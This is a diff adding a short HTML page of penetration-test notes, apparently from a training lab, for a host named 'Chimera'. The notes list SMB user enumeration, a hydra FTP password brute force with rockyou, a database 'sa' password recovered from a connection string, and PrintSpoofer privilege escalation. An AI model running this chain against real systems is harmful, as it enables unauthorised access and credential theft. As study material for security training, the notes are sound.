@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.1.1.68 Chimera</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.1.1.68 Chimera</h1><br/>proxychains nmap -sT -Pn --script=smb-enum-users.nse 10.1.1.68								= steph<br />proxychains hydra -t 1 -l steph -P /usr/share/wordlists/rockyou.txt -vV 10.1.1.68 ftp		= billabong<br />proxychains ftp 10.1.1.68																								= smartstore build files<br />grep -ir &#39;User Id&#39;	(part of a mssql connection string)													= sa:CrimsonQuiltScalp193<br />whoami /groups IeImpersonate Token	+ PrintSpoofer.exe												= root</div></body></html>
